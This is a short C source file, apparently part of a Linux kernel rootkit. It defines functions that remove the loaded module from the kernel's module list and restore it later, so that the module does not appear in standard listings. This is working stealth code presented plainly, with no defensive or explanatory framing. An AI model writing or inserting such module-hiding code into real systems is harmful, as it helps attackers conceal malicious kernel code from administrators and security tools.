#include "module.h"

bool module_hide=0;
static struct list_head *pre_module;

void hide_module(void){
  if(module_hide){
    return ;
  }
  pre_module=THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  module_hide=1;
  return ;
}

void unhide(void){
  if(module_hide==0){
    return ;
  }
  printk(KERN_INFO "Added to the list!");
  list_add(&THIS_MODULE->list,pre_module);
  module_hide=0;
  return ;
}
